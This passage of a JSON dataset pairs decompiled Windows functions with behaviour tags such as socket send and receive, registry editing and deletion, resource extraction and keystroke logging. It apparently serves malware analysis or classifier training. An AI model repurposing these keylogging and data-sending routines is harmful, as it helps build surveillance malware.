        "decompiled_code": "\nvoid __cdecl fcn.0045b360(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045b360(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045b360(arg_8h);\n    }\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 100
    },
    "0045bb38": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bb38(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.00459f64();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.00459968();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.00459eb0();\n                }\n                else {\n                    fcn.00459e88();\n                    fcn.00459eb0();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.00459f8c();\n        fcn.0045bb38(iVar2);\n        fcn.00459f64();\n        fcn.0045bb38(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0045bfac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bfac(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.004598e8();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.004599a0();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.00459968();\n        if (cVar1 == '\\0') {\n            fcn.0045bfac(arg_8h);\n        }\n    }\n    iVar2 = fcn.00459f70();\n    if (iVar2 != 0) {\n        fcn.00459f70();\n        fcn.00459ec4();\n    }\n    fcn.0045a244(0x45bd40, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 253
    },
    "0045dbe4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045dbe4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x45dd2e;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.0045dd3c();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.004070f8();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            fcn.0042b5f0();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.0042b5f0();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.004070f8();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            arg_8h = &var_4h;\n            fcn.0042b5c4();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.0042b53c();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.004075f4(&var_14h);\n            fcn.0040af7c(arg_8h);\n            fcn.0042b3a4(0, uVar3);\n            fcn.00404eb4();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00405dc8();\n        fcn.0042b708();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405c48(0x45dd35);\n    fcn.00405490();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 779
    },
    "00465eac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00465eac(void)\n\n{\n    int32_t iVar1;\n    \n    *0x491994 = 0;\n    iVar1 = sub.user32.dll_GetWindow();\n    while (iVar1 != 0) {\n        iVar1 = func_0x0040821c(iVar1, 2);\n        *0x491994 = *0x491994 + 1;\n    }\n    iVar1 = *0x491994;\n    *0x491994 = 0;\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "00467ac0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00467ac0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack24 = 0x467ad2;\n    fcn.004058ec();\n    uStack28 = 0x467b42;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack40 = 0x467b1b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar2 = 1;\n    puStack24 = &stack0xfffffffc;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if (iVar1 < iVar2) break;\n        fcn.00467918();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack44;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x467b49;\n    uStack28 = 0x467b41;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 305
    },
    "0046feb4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046feb4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0047f870": {
        "rules": [
            "contain loop",
            "send data on socket",
            "send data",
            "receive data",
            "receive data on socket"
        ],
        "decompiled_code": "\nvoid fcn.0047f870(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    uStack36 = 0x47f99f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    uStack48 = 0x47f975;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.0041bd84();\n    fcn.0041b674(0, 0);\n    fcn.00469ce4();\n    fcn.0041b674(0, 0);\n    do {\n        puVar1 = (**(**0x498950 + 0xc))();\n        if (puVar1 == NULL) break;\n        uStack40 = 0;\n        uStack48 = 0x49999c;\n        uStack52 = *0x498994;\n        puStack44 = puVar1;\n        sub.wsock32.dll_send();\n        sub.wsock32.dll_recv(*0x498994, 0x49999c, 0x2000, 0);\n        fcn.00403aac();\n    } while (puVar1 != NULL);\n    fcn.00409ce8();\n    fcn.00405784();\n    fcn.00472bec();\n    uVar2 = *0x498994;\n    sub.wsock32.dll_recv(*0x498994, 0x49999c, 0x2000);\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = 0;\n    fcn.00405490(0x47f9a6);\n    return;\n}\n",
        "token_count": 452
    },
    "00480ab0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00480ab0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x480b2e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033ac();\n    fcn.0040546c();\n    iVar1 = 0x400;\n    do {\n        fcn.004033d4();\n        fcn.00405654();\n        fcn.00405738();\n        fcn.004054c0();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x480b35;\n    uStack32 = 0x480b2d;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 236
    },
    "00480f28": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00480f28(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x480fa6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033ac();\n    fcn.0040546c();\n    iVar1 = 0x400;\n    do {\n        fcn.004033d4();\n        fcn.00405654();\n        fcn.00405738();\n        fcn.004054c0();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x480fad;\n    uStack32 = 0x480fa5;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 233
    },
    "0048190c": {
        "rules": [
            "contain loop",
            "send data on socket",
            "send data",
            "receive data",
            "receive data on socket"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048190c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    fcn.004030ec();\n    iVar1 = fcn.00470060();\n    piVar2 = fcn.00404610();\n    fcn.0041b6d8(iVar1, iVar1 >> 0x1f);\n    fcn.0041b8b8();\n    fcn.0041b674(0, 0);\n    do {\n        iVar1 = (**(*piVar2 + 0xc))();\n        if (iVar1 == 0) break;\n        sub.wsock32.dll_send(*0x49eb88, 0x49cb84, iVar1);\n        fcn.00403aac();\n        sub.wsock32.dll_recv(*0x49eb88, 0x49cb84, 0x2000, 0);\n        fcn.00403aac();\n    } while (iVar1 != 0);\n    fcn.00472bec();\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 243
    },
    "00482980": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00482980(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 6;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_18h = 0x4829a5;\n    var_8h = param_2;\n    fcn.004058ec();\n    var_18h = 0x4829ad;\n    fcn.004058ec();\n    uVar1 = true;\n    var_1ch = 0x482bc9;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482980::var_20h;\n    var_18h = &stack0xfffffffc;\n    fcn.00405894();\n    if (!uVar1) {\n        fcn.00405894();\n        if (!uVar1) {\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048238c();\n                fcn.0040a54c();\n                var_2ch = var_8h;\n                fcn.00405800(var_8h, 0x482c04, var_ch);\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.0048238c();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.004822c4();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                uVar1 = 1;\n                fcn.00482120();\n                fcn.00405784();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.004821fc();\n                fcn.00405784();\n            }\n            goto code_r0x00482bae;\n        }\n    }\n    fcn.004054c0();\ncode_r0x00482bae:\n    *in_FS_OFFSET = var_2ch;\n    fcn.00405490(0x482bd0);\n    return;\n}\n",
        "token_count": 864
    },
    "004895cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004895cc(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x489760;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004895cc::var_24h;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    fcn.0040546c();\n    piVar1 = fcn.00420f38();\n    piVar2 = fcn.00404610();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042164c();\n    iVar3 = (**(*piVar2 + 0x14))();\n    if (-1 < iVar3 + -1) {\n        var_20h = 0;\n        var_24h = iVar3;\n        do {\n            (**(*piVar2 + 0xc))();\n            fcn.00405784();\n            fcn.00421158();\n            fcn.004218dc();\n            fcn.004218dc();\n            fcn.004218dc();\n            fcn.004218dc();\n            fcn.004218dc();\n            (**(*piVar2 + 0xc))(*var_1ch);\n            var_4h = 0x489868;\n            var_8h = var_ch;\n            var_ch = 0x489868;\n            var_14h = 0x489868;\n            var_18h = 0x489868;\n            var_1ch = 0x489868;\n            var_20h = 0x489868;\n            var_24h = 0x489874;\n            fcn.00405800();\n            var_20h = var_20h + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    fcn.00404640();\n    fcn.00420fe4();\n    (**(*piVar1 + -4))();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x489767;\n    var_20h = 0x489752;\n    fcn.00405490();\n    var_20h = 0x48975f;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 752
    },
    "0048a4b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048a4b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack40 = 0x48a4c8;\n    fcn.004058ec();\n    uStack44 = 0x48a58e;\n    puStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0048c938();\n    fcn.00405504();\n    iVar1 = fcn.00406858();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00405504();\n            puStack48 = &fcn.0048a4b0::var_8h;\n            iVar2 = fcn.00405a48();\n            uVar3 = iVar2 == 1;\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00409af4();\n            fcn.00405894();\n            if (uVar3) {\n                fcn.0040546c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack48;\n    puStack40 = 0x48a595;\n    uStack44 = 0x48a58d;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 400
    },
    "0048a5a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048a5a8(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack40 = 0x48a5c0;\n    fcn.004058ec();\n    uStack44 = 0x48a685;\n    puStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0048c938();\n    fcn.00405504();\n    iVar1 = fcn.00406858();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00405504();\n            puStack48 = &fcn.0048a5a8::var_8h;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00409af4();\n            fcn.00405894();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack48;\n    puStack40 = 0x48a68c;\n    uStack44 = 0x48a684;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 353
    },
    "0048a6a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048a6a4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack40 = 0x48a6bc;\n    fcn.004058ec();\n    uStack44 = 0x48a787;\n    puStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0048c938();\n    fcn.00405504();\n    iVar1 = fcn.00406858();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00405504();\n            puStack48 = &fcn.0048a6a4::var_ch;\n            iVar2 = fcn.00405a48();\n            uVar3 = iVar2 == 1;\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00409af4();\n            fcn.00405894();\n            if (uVar3) {\n                fcn.00409e54();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack48;\n    puStack40 = 0x48a78e;\n    uStack44 = 0x48a786;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 403
    },
    "0048ae44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0048ae44(void)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar3 = 6;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_1ch = 0x48af46;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_28h = 0x48af0c;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_2ch;\n    uVar1 = **0x4929e0;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.0048bf28();\n    fcn.0048c5c8(var_ch);\n    fcn.0048c00c(var_10h);\n    fcn.0048c21c(var_14h);\n    fcn.0048c2cc(var_18h);\n    fcn.0048c378(var_1ch);\n    fcn.0048c438(var_20h);\n    puVar2 = var_24h;\n    fcn.0048c500();\n    fcn.0048beec(var_28h);\n    fcn.0048beb0(var_2ch);\n    fcn.00405800();\n    fcn.0045e980();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = puVar2;\n    fcn.00405490(0x48af4d);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 571
    },
    "0040a13c": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a13c(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 89
    },
    "0040a168": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a168(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 88
    },
    "004217dc": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004217dc(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403aac();\n    uVar2 = fcn.004058fc(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.00420f10();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 199
    },
    "0042b9d8": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0042b9d8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42ba4c);\n    if (iVar1 != 0) {\n        *0x490e78 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ba58);\n        *0x490e7c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ba6c);\n        *0x490e80 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ba7c);\n        *0x490e84 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ba94);\n        *0x490e88 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42baac);\n        *0x490e8c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42bac4);\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0043110c": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0043110c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x431270);\n    if (iVar1 != 0) {\n        *0x497bf0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431280);\n        *0x497bf4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431294);\n        *0x497be8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4312a8);\n        *0x497bec = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4312c0);\n        *0x497bc4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4312d8);\n        if (*0x497bc4 == 0) {\n            *0x497bc4 = 0x4080bc;\n        }\n        *0x497bc8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4312f0);\n        if (*0x497bc8 == 0) {\n            *0x497bc8 = 0x408514;\n        }\n        *0x497bcc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431308);\n        if (*0x497bcc == 0) {\n            *0x497bcc = 0x408244;\n        }\n        *0x497bd0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431320);\n        if (*0x497bd0 == 0) {\n            *0x497bd0 = 0x408234;\n        }\n        *0x497bd4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431338);\n        if (*0x497bd4 == 0) {\n            *0x497bd4 = 0x40823c;\n        }\n        *0x497bd8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x43134c);\n        if (*0x497bd8 == 0) {\n            *0x497bd8 = 0x4084c4;\n        }\n        *0x497bdc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431360);\n        if (*0x497bdc == 0) {\n            *0x497bdc = 0x4084bc;\n        }\n        *0x497be0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431378);\n        if (*0x497be0 == 0) {\n            *0x497be0 = 0x4084cc;\n        }\n    }\n    return;\n}\n",
        "token_count": 611
    },
    "00447184": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00447184(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x4471a8);\n    if (iVar1 != 0) {\n        *0x4914e8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x4471b4);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00468500": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00468500(void)\n\n{\n    *0x49879c = sub.kernel32.dll_LoadLibraryA(0x468528);\n    *0x4987a0 = sub.kernel32.dll_GetProcAddress_1(*0x49879c, 0x468538);\n    return;\n}\n",
        "token_count": 66
    },
    "0040d2f4": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d2f4(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 89
    },
    "0040772c": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.0040772c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4957f4 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4907b0 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4907b0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.004076e8();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4907b0);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4957fc;\n}\n",
        "token_count": 163
    },
    "0041c1a4": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c1a4(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c104(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c104(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041bcf4();\n    return;\n}\n",
        "token_count": 205
    },
    "004215c4": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.004215c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar2 = sub.advapi32.dll_RegDeleteValueA(*(in_EAX + 4), uVar1);\n    return uVar2 & 0xffffff00 | uVar2 == 0;\n}\n",
        "token_count": 94
    },
    "0048034c": {
        "rules": [
            "log keystrokes"
        ],
        "decompiled_code": "\nuint fcn.0048034c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_MapVirtualKeyA();\n    if (iVar1 == 0x1a) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0043b068": {
        "rules": [
            "log keystrokes via polling"
        ],
